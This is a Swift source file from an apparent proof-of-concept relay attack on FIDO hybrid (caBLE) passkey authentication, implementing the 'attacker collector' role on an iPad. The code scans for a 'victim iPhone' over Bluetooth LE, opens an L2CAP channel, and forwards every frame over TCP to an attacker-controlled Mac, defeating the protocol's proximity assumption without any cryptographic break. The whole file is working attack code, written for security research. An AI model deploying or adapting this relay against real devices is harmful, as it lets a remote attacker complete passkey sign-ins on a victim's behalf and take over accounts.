//
//  CollectorCentral.swift
//  cable-relay-poc — ATTACKER COLLECTOR role (runs on the iPad)
//
//  The iPad sits ~1 m from the victim iPhone. It is a BLE central AND a
//  TCP client to the Mac. It performs NO crypto of its own: it opens the
//  L2CAP channel to the phone, then becomes a dumb bidirectional pump —
//  every frame from the phone goes to the Mac over TCP, every frame from
//  the Mac goes to the phone over L2CAP.
//
//  This is the relay. Note what is absent: no key, no Noise state, no
//  parsing of message bodies. It cannot read the traffic (it does not hold
//  the keys). It does not need to. That is the entire thesis — relay needs
//  no cryptographic break.
//
//  The TCP leg models FIDO's generic tunnel server: a public encrypted
//  byte-bridge that will carry whatever you put on it.
//

import Foundation
import CoreBluetooth
import Network

final class CollectorCentral: NSObject, ObservableObject {

    @Published var log: [String] = []
    @Published var relaying = false

    // --- config: where the Mac relay-browser's TCP bridge listens ---
    var bridgeHost: String = "192.168.1.50"
    var bridgePort: UInt16 = 7070

    private var manager: CBCentralManager!
    private var phone: CBPeripheral?
    private var psmChar: CBCharacteristic?
    private var channel: CBL2CAPChannel?
    private var l2capIn = Data()
    private var l2capReady = false
    private var pendingToPhone: [Data] = []

    private var tcp: NWConnection?
    private var tcpIn = Data()
    private var tcpReady = false

    func start() {
        manager = CBCentralManager(delegate: self, queue: .main)
        connectBridge()
    }

    private func line(_ s: String) {
        NSLog("[IPAD-RELAY] %@", s)
        AxiomLog.shared?.log(s)
        DispatchQueue.main.async { self.log.append(s) }
    }

    // MARK: TCP bridge to the Mac
    private func connectBridge() {
        let conn = NWConnection(
            host: NWEndpoint.Host(bridgeHost),
            port: NWEndpoint.Port(rawValue: bridgePort)!,
            using: .tcp)
        conn.stateUpdateHandler = { [weak self] st in
            guard let self else { return }
            switch st {
            case .ready:
                self.tcpReady = true
                self.line("TCP bridge to Mac ready")
                self.pumpTCP()
            case .failed(let e): self.line("TCP failed \(e)")
            case .waiting(let e): self.line("TCP waiting \(e)")
            default: break
            }
        }
        tcp = conn
        conn.start(queue: .main)
    }

    private func pumpTCP() {
        tcp?.receive(minimumIncompleteLength: 1, maximumLength: 65536) { [weak self] data, _, done, err in
            guard let self else { return }
            if let d = data, !d.isEmpty {
                self.tcpIn.append(d)
                for frame in Frame.drain(&self.tcpIn) {
                    self.toPhone(frame)
                }
            }
            if let err { self.line("TCP recv error: \(err)"); return }
            if done { self.line("TCP done (EOF)"); return }
            self.pumpTCP()
        }
    }

    private func toMac(_ frame: Data) {
        guard tcpReady else { line("toMac: TCP not ready, dropping"); return }
        tcp?.send(content: Frame.encode(frame), completion: .contentProcessed { [weak self] err in
            if let err { self?.line("TCP send error: \(err)") }
        })
    }

    private func toPhone(_ frame: Data) {
        guard l2capReady, let out = channel?.outputStream else {
            line("toPhone: L2CAP not ready, buffering frame (\(frame.count) bytes)")
            pendingToPhone.append(frame)
            return
        }
        let wire = Frame.encode(frame)
        let n = wire.withUnsafeBytes { out.write($0.bindMemory(to: UInt8.self).baseAddress!,
                                                  maxLength: wire.count) }
        if n < 0 {
            line("toPhone: write error \(out.streamError?.localizedDescription ?? "unknown")")
        }
    }

    private func flushPendingToPhone() {
        guard !pendingToPhone.isEmpty else { return }
        line("flushing \(pendingToPhone.count) buffered frame(s) to phone")
        let frames = pendingToPhone
        pendingToPhone.removeAll()
        for frame in frames { toPhone(frame) }
    }
}

// MARK: - Central: find phone, read PSM, open L2CAP
extension CollectorCentral: CBCentralManagerDelegate, CBPeripheralDelegate {

    func centralManagerDidUpdateState(_ c: CBCentralManager) {
        guard c.state == .poweredOn else { line("BLE state \(c.state.rawValue)"); return }
        c.scanForPeripherals(withServices: [CBUUID(string: BLEIDs.serviceUUID)])
        line("scanning for victim phone")
    }

    func centralManager(_ c: CBCentralManager, didDiscover p: CBPeripheral,
                        advertisementData: [String: Any], rssi RSSI: NSNumber) {
        line("discovered phone RSSI \(RSSI)")
        c.stopScan()
        phone = p
        p.delegate = self
        c.connect(p)
    }

    func centralManager(_ c: CBCentralManager, didConnect p: CBPeripheral) {
        line("connected; discovering service")
        p.discoverServices([CBUUID(string: BLEIDs.serviceUUID)])
    }

    func centralManager(_ c: CBCentralManager, didFailToConnect p: CBPeripheral, error: Error?) {
        line("failed to connect: \(error?.localizedDescription ?? "unknown")")
    }

    func peripheral(_ p: CBPeripheral, didDiscoverServices error: Error?) {
        if let e = error { line("discover services error: \(e.localizedDescription)"); return }
        guard let svc = p.services?.first else { line("no services found"); return }
        line("found service; discovering PSM characteristic")
        p.discoverCharacteristics([CBUUID(string: BLEIDs.psmCharUUID)], for: svc)
    }

    func peripheral(_ p: CBPeripheral, didDiscoverCharacteristicsFor s: CBService, error: Error?) {
        if let e = error { line("discover chars error: \(e.localizedDescription)"); return }
        guard let ch = s.characteristics?.first else { line("no characteristics found"); return }
        psmChar = ch
        line("found PSM characteristic; reading value")
        p.readValue(for: ch)
    }

    func peripheral(_ p: CBPeripheral, didUpdateValueFor ch: CBCharacteristic, error: Error?) {
        if let e = error { line("read PSM error: \(e.localizedDescription)"); return }
        guard let v = ch.value, v.count == 2 else { line("bad PSM value"); return }
        let psm = v.withUnsafeBytes { CBL2CAPPSM($0.load(as: UInt16.self).bigEndian) }
        line("read PSM \(psm); opening L2CAP")
        p.openL2CAPChannel(psm)
    }

    func peripheral(_ p: CBPeripheral, didOpen channel: CBL2CAPChannel?, error: Error?) {
        if let e = error { line("L2CAP open error \(e.localizedDescription)"); return }
        guard let ch = channel else { line("L2CAP channel nil"); return }
        self.channel = ch
        ch.inputStream.delegate = self
        ch.outputStream.delegate = self
        ch.inputStream.schedule(in: .main, forMode: .common)
        ch.outputStream.schedule(in: .main, forMode: .common)
        ch.inputStream.open()
        ch.outputStream.open()
        l2capReady = true
        relaying = true
        line("L2CAP open — RELAY ACTIVE (phone<->iPad radio, iPad<->Mac TCP)")
        flushPendingToPhone()
    }
}

// MARK: - Pump L2CAP -> Mac
extension CollectorCentral: StreamDelegate {
    func stream(_ aStream: Stream, handle event: Stream.Event) {
        switch event {
        case .hasBytesAvailable:
            guard let inp = channel?.inputStream else { return }
            var tmp = [UInt8](repeating: 0, count: 4096)
            while inp.hasBytesAvailable {
                let n = inp.read(&tmp, maxLength: tmp.count)
                if n > 0 { l2capIn.append(contentsOf: tmp[0..<n]) } else { break }
            }
            for frame in Frame.drain(&l2capIn) {
                line("L2CAP -> Mac: relaying \(frame.count) bytes")
                toMac(frame)
            }
        case .hasSpaceAvailable:
            break
        case .errorOccurred:
            line("L2CAP stream error: \(aStream.streamError?.localizedDescription ?? "unknown")")
        case .endEncountered:
            line("L2CAP stream ended")
            l2capReady = false
        default: break
        }
    }
}
